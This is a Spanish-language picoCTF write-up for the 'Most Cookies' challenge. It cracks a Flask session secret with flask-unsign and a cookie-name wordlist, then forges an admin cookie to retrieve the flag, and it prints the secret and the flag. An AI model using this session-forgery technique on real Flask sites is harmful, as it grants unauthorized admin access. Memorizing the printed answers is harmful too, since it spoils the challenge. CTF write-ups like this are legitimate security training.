# Most Cookies

## Descripción

El servidor Flask elige aleatoriamente un secreto de una lista de 28 nombres de galletas para firmar los cookies de sesión. El objetivo es modificar el cookie para cambiar `very_auth` de `blank` a `admin` y acceder a la página que muestra el flag.

## Solución

### Paso 1: Obtener el cookie inicial

```bash
curl -s -i http://wily-courier.picoctf.net:56988/ | grep -i "set-cookie"
```

Resultado: `session=eyJ2ZXJ5X2F1dGciOiJibGFuayJ9.agKZHg.MPr8jEox2J_mUImAwK11XKIWwXo`

### Paso 2: Instalar flask-unsign

```bash
pip3 install flask-unsign
```

### Paso 3: Crackear el secreto

Crear wordlist de 28 nombres de galletas:

```bash
cat > /tmp/cookies.txt << 'EOFCOOKIE'
snickerdoodle
chocolate chip
oatmeal raisin
gingersnap
shortbread
peanut butter
whoopie pie
sugar
molasses
kiss
biscotti
butter
spritz
snowball
drop
thumbprint
pinwheel
wafer
macaroon
fortune
crinkle
icebox
gingerbread
tassie
lebkuchen
macaron
black and white
white chocolate macadamia
EOFCOOKIE
```

Crackear:

```bash
python3 -m flask_unsign --unsign --cookie "eyJ2ZXJ5X2F1dGciOiJibGFuayJ9.agKZHg.MPr8jEox2J_mUImAwK11XKIWwXo" --wordlist /tmp/cookies.txt
```

Resultado: `Found secret key after 28 attempts: 'macaroon'`

### Paso 4: Firmar nuevo cookie con very_auth=admin

**IMPORTANTE**: Usar flag `--legacy` para Flask antiguo:

```bash
python3 -m flask_unsign --sign --cookie "{'very_auth': 'admin'}" --secret "macaroon" --legacy
```

Resultado: `eyJ2ZXJ5X2F1dGciOiJhZG1pbiJ9.agKSDw.hDXCq4qStmPjdDnDXQUr92B6qXg`

### Paso 5: Usar el nuevo cookie para obtener el flag

```bash
curl -s "http://wily-courier.picoctf.net:56988/display" \
  -H "Cookie: session=eyJ2ZXJ5X2F1dGciOiJhZG1pbiJ9.agKSDw.hDXCq4qStmPjdDnDXQUr92B6qXg" | grep -o "picoCTF{[^}]*}"
```

Flag: `picoCTF{cO0ki3s_yum_b8a89e75}`

## Notas

- Cada instancia del servidor elige un secreto diferente aleatoriamente
- El flag `--legacy` es crucial para Flask versiones antiguas - genera el timestamp correcto que el servidor acepta
- Sin `--legacy`, el servidor redirige en lugar de mostrar el flag
- No recargar la página durante el proceso o el secreto cambiará

## Referencias

- Flask session cookie signing: https://flask.palletsprojects.com/en/2.0.x/config/
- flask-unsign tool: https://github.com/Paradoxis/Flask-Unsign
